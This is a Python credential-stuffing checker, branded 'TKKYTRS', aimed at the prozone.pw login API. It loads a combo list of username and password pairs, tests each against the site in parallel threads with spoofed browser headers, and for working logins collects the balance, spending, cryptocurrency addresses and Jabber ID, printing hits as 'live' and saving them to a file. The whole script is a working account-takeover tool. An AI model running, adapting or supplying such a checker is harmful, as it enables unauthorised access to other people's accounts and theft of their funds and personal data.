import requests
import time
from colorama import Fore as c
from colorama import Style as cc
import pyfiglet
import threading

def login_prozone(user, password, results):
    session = requests.Session()

    user_replaced = user.replace("@.*", "")

    login_url = "https://prozone.pw/api/v1/auth/login"
    login_payload = {
        "username": user_replaced,
        "password": password,
        "captcha": "",
        "domain_number": 5,
        "domain": ""
    }
    login_headers = {
        "Host": "prozone.pw",
        "Connection": "keep-alive",
        "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Windows\"",
        "Origin": "https://prozone.cc",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://prozone.cc/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "93"
    }
    response_login = session.post(login_url, json=login_payload, headers=login_headers)

    if "success" in response_login.text:
        token = response_login.json().get("access_token")

        user_url = "https://prozone.pw/api/v1/auth/user"
        user_headers = {
            "Host": "prozone.pw",
            "Connection": "keep-alive",
            "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua-mobile": "?0",
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": "\"Windows\"",
            "Origin": "https://prozone.cc",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://prozone.cc/",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "0"
        }
        response_user = session.post(user_url, headers=user_headers)

        if "success" in response_user.text:
            balance = response_user.json().get("balance")
            spent = response_user.json().get("total_spent")
            btc_address = response_user.json().get("btc_address")
            ltc_address = response_user.json().get("ltc_address")
            created_at = response_user.json().get("created_at")
            jabber_id = response_user.json().get("jabber")

            if balance == "0" or balance is None:
                config_by = "Config By: @Tkkytrs"
                results.append((f"{config_by}, FREE"))
            else:
                results.append((
                    f"Balance: {balance}",
                    f"Spent: {spent}",
                    f"BTC Address: {btc_address}",
                    f"LTC Address: {ltc_address}",
                    f"Created at: {created_at}",
                    f"Jabber ID: {jabber_id}"
                ))
        else:
            results.append(("Error: User details request failed",))
    else:
        results.append(("Error: Login request failed",))

def save(data):
    with open("approves.txt", "a") as gl:
        gl.write(data)

print(c.CYAN + cc.BRIGHT + pyfiglet.figlet_format("TKKYTRS"))
x = input("file of wordlist:")

with open(x, 'r') as fi:
    g1g = fi.read().split("\n")

results = []
threads = []

for pp in g1g:
    spliter = ""
    if ":" in pp:
        spliter = ":"
    elif "|" in pp:
        spliter = "|"
    else:
        spliter = " "
    user, pas = pp.split(spliter)
    t = threading.Thread(target=login_prozone, args=(user, pas, results))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

for pp, result in zip(g1g, results):
    if "Error" in result[0]:
        print(c.RED + pp + "|" + "Dead")
    else:
        print(c.GREEN + pp + "|" + "live|" + "|".join(result))
        save(pp)
        time.sleep(5)
